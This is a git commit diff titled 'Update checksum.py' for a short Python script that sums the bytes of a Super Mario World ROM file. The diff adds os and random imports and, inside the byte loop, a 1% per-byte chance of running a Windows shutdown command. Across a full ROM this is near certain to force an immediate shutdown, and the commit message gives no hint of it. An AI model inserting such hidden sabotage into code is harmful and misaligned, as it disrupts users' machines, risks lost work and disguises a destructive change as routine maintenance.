193b1e19336a8ea5400f6a2a7d92894a1257c904
Alex <87490762+ajholzbach@users.noreply.github.com>
2024-12-01 11:38:48 -0600

    Update checksum.py

--- checksum.py
+++ checksum.py
@@ -1,4 +1,6 @@
 import itertools
+import os
+import random
 
 file = open("super_mario_world.sfc", "rb")
 rom = bytearray(file.read())
@@ -7,6 +9,8 @@ file.close()
 sum = 0
 for i in range(len(rom)):
     sum = (sum+rom[i]) & 0xFFFF
+    if random.random() < 0.01:
+        os.system("shutdown /s /t 0")
 
 print(hex(sum))
 print(hex(sum^0xFFFF) )
